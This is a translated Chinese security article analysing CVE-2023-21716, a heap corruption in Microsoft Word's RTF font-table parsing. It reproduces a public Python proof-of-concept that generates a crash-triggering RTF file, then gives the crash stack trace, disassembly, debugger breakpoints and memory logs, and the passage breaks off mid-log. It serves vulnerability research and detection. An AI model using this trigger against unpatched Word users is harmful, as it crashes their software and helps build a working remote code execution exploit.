---
title: 最新 RTF RCE 漏洞 CVE-2023-21716 分析
url: https://www.anquanke.com/post/id/287370
source: 安全客-有思想的安全新媒体
date: 2023-03-15
fetch_date: 2025-10-04T09:33:11.921541
---

# 最新 RTF RCE 漏洞 CVE-2023-21716 分析

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 最新 RTF RCE 漏洞 CVE-2023-21716 分析

阅读量**4960415**

发布时间 : 2023-03-14 15:30:46

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## 背景

微软在 2 月 14 日发布的补丁修复了一个 CVSS v3.1 高达 9.8 分的 Microsoft Word 远程代码执行漏洞，该漏洞是 Microsoft Word 的 RTF 解析器在处理 rtf 文件字体表(\fonttbl)中包含的过多字体(\fN)时产生的堆损坏漏洞，而堆损坏是由处理字体时的汇编指令 movsx 导致的整数溢出引起的。近日漏洞发现者 Joshua J. Drake 公布了漏洞的 POC，360 沙箱云团队第一时间使用该 POC 进行了漏洞复现与分析，并就此漏洞触发路径和指令在沙箱云检测引擎中增加检测方案，保护用户免遭此漏洞的威胁。

## 分析环境

* Windows 10 x64 1607
* Office 2016，Windbg，IDA Pro 7.5
* wwlib(16.0.4266.1003)

## POC

POC.rtf 使用 Joshua J. Drake 提供的 python 脚本生成。

```
import sys
open("t3zt.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
```

POC.rtf 的内容较为简单，仅包括 \rtfN、\fonttbl、\fN 和 \rtlch 控制字，此次漏洞发生在 rtf 解释器 wwlib 模块处理 \fonttbl 和 \fN 控制字时，POC.rtf 内容如下。

```
{\rtf1{
{\fonttbl{\f0A;}
{\f1A;}
{\f2A;}
{\f3A;}
{\f4A;}
{\f5A;}
{\f6A;}
...
{\f32755A;}
{\f32756A;}
{\f32757A;}
{\f32758A;}
{\f32759A;}
{\f32760A;}
}
{\rtlch no crash??}
}}
```

## crash 现场

对 winword.exe 开启页堆，可以得到以下的栈回溯。

```
 (c70.dc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=006f23ac ebx=00000001 ecx=000004e4 edx=ffff7ffc esi=362ceff0 edi=00008002
eip=6abb00d5 esp=006f2304 ebp=006f2310 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
wwlib!PTLS7::FsUpdateFinitePage+0x7635a:
6abb00d5 66894c5604      mov     word ptr [esi+edx*2+4],cx ds:002b:362befec=????
0:000> kv
 # ChildEBP RetAddr  Args to Child
WARNING: Stack unwind information not available. Following frames may be wrong.
00 006f2310 6abaa3ef 17da1268 00007ff8 006f238c wwlib!PTLS7::FsUpdateFinitePage+0x7635a
01 006f51e8 6aba651c 17da1230 006f555c 0005d400 wwlib!PTLS7::FsUpdateFinitePage+0x70674
02 006f579c 6aef05ac 17da1230 006f57dc 00000070 wwlib!PTLS7::FsUpdateFinitePage+0x6c7a1
03 006f5bec 6aeeffb5 0000000b 17da1230 17da1264 wwlib!PTLS7::LsDestroyContext+0x246427
04 006f5e40 6aa4a593 0000000b 04012000 40280000 wwlib!PTLS7::LsDestroyContext+0x245e30
05 006f772c 6a9068ef 0000000b 00000000 04012000 wwlib!PTLS7::FsUpdateBottomlessPage+0x17494
06 006f7c54 6aa654ed 006f8530 00000001 00000000 wwlib!PTLS7::LsAssert+0x2bd1c
07 006f905c 6aa63d3b 006f93f0 006f93e8 04012000 wwlib!PTLS7::FsUpdateBottomlessPage+0x323ee
08 006f90e0 6b56be52 006f93f0 006f93e8 04012000 wwlib!PTLS7::FsUpdateBottomlessPage+0x30c3c
09 006fa66c 6ae6013a 006fa6c8 00000824 00000000 wwlib!wdGetApplicationObject+0xdf8a0
0a 006fb718 6aca4e9e 006ff990 ffffffff 00000001 wwlib!PTLS7::LsDestroyContext+0x1b5fb5
0b 006fb948 6a8ceb47 7668a200 6a8c0000 00000001 wwlib!PTLS7::LsQueryLineUp+0x41cf1
0c 006fb978 6a8ce971 0000000a 00430022 005c003a wwlib!FMain+0x273
0d 006ff9fc 6a8ce906 0000000a 6a8ce8d4 006ffa30 wwlib!FMain+0x9d
0e 006ffa0c 00141762 00140000 00000000 02fbefd4 wwlib!FMain+0x32
0f 006ffa30 00141194 00140000 00000000 02fbefd4 winword+0x1762
10 006ffa7c 766862c4 0045c000 766862a0 1455d81a winword+0x1194
11 006ffa90 77ed0609 0045c000 6d907d52 00000000 KERNEL32!BaseThreadInitThunk+0x24 (FPO: [Non-Fpo])
12 006ffad8 77ed05d4 ffffffff 77ef2523 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [SEH])
13 006ffae8 00000000 00141000 0045c000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
```

通过栈回溯得到以下调用链，由于没有 wwlib.dll 模块的符号只简单的揣测了一下几个关键函数的作用。

![]()

## 根本原因分析

查看 crash func(sub\_102F0020) 及崩溃地址处的上下文，经过一番调试摸清了 sub\_102F0020 函数的参数意义和崩溃原因。

sub\_102F0020 函数用于处理 fond id 也就是 /fN 中的 N，其会将 fond id 和 codepage value 存储在一个由 Cum 和 Base 计算偏移的地址上。 Base 的初始值是 0xa，且每当处理了 0xa 个 fond id 就会累加 0xa。

![]()

存储 fond id 和 codepage value 的代码片段同时也是 crash 时的上下文。

```
.text:102F00A2    movsx   eax, word ptr [esi]//获得 Cum
.text:102F00A5    mov     ecx, [ebp+arg_4]//获得 fond id
.text:102F00A8    mov     [esi+eax*2+4], cx//存储 fond id        <---- bp1
.text:102F00AD    movsx   eax, word ptr [esi+2]
.text:102F00B1    movsx   ecx, word ptr [esi]
.text:102F00B4    add     ecx, eax
.text:102F00B6    mov     eax, [ebp+arg_8]
.text:102F00B9    mov     ax, [eax]
.text:102F00BC    mov     [esi+ecx*2+4], ax
.text:102F00C1    mov     eax, [ebp+arg_10]
.text:102F00C4    test    eax, eax
.text:102F00C6    jz      short loc_102F00DA
.text:102F00C8    movsx   ecx, word ptr [esi]//获得 Cum
.text:102F00CB    movsx   edx, word ptr [esi+2]//获得 Base       <---- bp2
.text:102F00CF    lea     edx, [ecx+edx*2]//计算偏移             <---- bp3
.text:102F00D2    mov     cx, [eax]//获得 codepage value
.text:102F00D5    mov     [esi+edx*2+4], cx//存储 codepage value <---- bp4 <- crash
.text:102F00DA    inc     word ptr [esi]//增加 Cum 计数
```

在上述代码片段中下 4 个断点查看存储过程，注意各寄存器对应关系。

```
bp wwlib+2F00A8 ".printf \" Cum: %p Font id: %p Target addr: %p from 0x%x + 0x%x*2 + 4\\n \", eax,ecx,(esi+eax*2+4),esi,eax; gc"
bp wwlib+2F00CB ".printf \" Base: %p \\n \", poi(esi+2); gc"
bp wwlib+2F00CF ".printf \" Edx: %p from 0x%x + 0x%x*2\\n \", (ecx + edx*2),ecx,edx; gc"
bp wwlib+2F00D5 ".printf \" Target addr: %p from 0x%x + 0x%x*2 + 4\\n \", (esi+edx*2+4),esi,edx; gc"
```

崩溃前断点记录到的存储过程信息。

```
  ...
 ---------------------------------------------------------------------------------------
  Cum: 00007fec Font id: 00007fec Target addr: 3b3e0044 from 0x3b3d0068 + 0x7fec*2 + 4
  Base: 00007fee
  Edx: 00017fc8 from 0x7fec + 0x7fee*2
  Target addr: 3b3ffffc from 0x3b3d0068 + 0x17fc8*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007fed Font id: 00007fed Target addr: 3b3e0046 from 0x3b3d0068 + 0x7fed*2 + 4
  Base: 00007fee
  Edx: 00017fc9 from 0x7fed + 0x7fee*2
  Target addr: 3b3ffffe from 0x3b3d0068 + 0x17fc9*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007fee Font id: 00007fee Target addr: 3e538008 from 0x3e528028 + 0x7fee*2 + 4
  Base: 00007ff8
  Edx: 00017fde from 0x7fee + 0x7ff8*2
  Target addr: 3e557fe8 from 0x3e528028 + 0x17fde*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007fef Font id: 00007fef Target addr: 3e53800a from 0x3e528028 + 0x7fef*2 + 4
  Base: 00007ff8
  Edx: 00017fdf from 0x7fef + 0x7ff8*2
  Target addr: 3e557fea from 0x3e528028 + 0x17fdf*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007ff0 Font id: 00007ff0 Target addr: 3e53800c from 0x3e528028 + 0x7ff0*2 + 4
  Base: 00007ff8
  Edx: 00017fe0 from 0x7ff0 + 0x7ff8*2
  Target addr: 3e557fec from 0x3e528028 + 0x17fe0*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007ff1 Font id: 00007ff1 Target addr: 3e53800e from 0x3e528028 + 0x7ff1*2 + 4
  Base: 00007ff8
  Edx: 00017fe1 from 0x7ff1 + 0x7ff8*2
  Target addr: 3e557fee from 0x3e528028 + 0x17fe1*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007ff2 Font id: 00007ff2 Target addr: 3e538010 from 0x3e528028 + 0x7ff2*2 + 4
  Base: 00007ff8
  Edx: 00017fe2 from 0x7ff2 + 0x7ff8*2
  Target addr: 3e557ff0 from 0x3e528028 + 0x17fe2*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007ff3 Font id: 00007ff3 Target addr: 3e538012 from 0x3e528028 + 0x7ff3*2 + 4
  Base: 00007ff8
  Edx: 00017fe3 from 0x7ff3 + 0x7ff8*2
  Target addr: 3e557ff2 from 0x3e528028 + 0x17fe3*2 + 4
 ---------------------------------------------------------------------------------------
  Cum: 00007ff4 Font id: 00007ff4 Target addr: 3e538014 from 0x3e528028 + 0x7ff4*2 + 4
  Base: 00...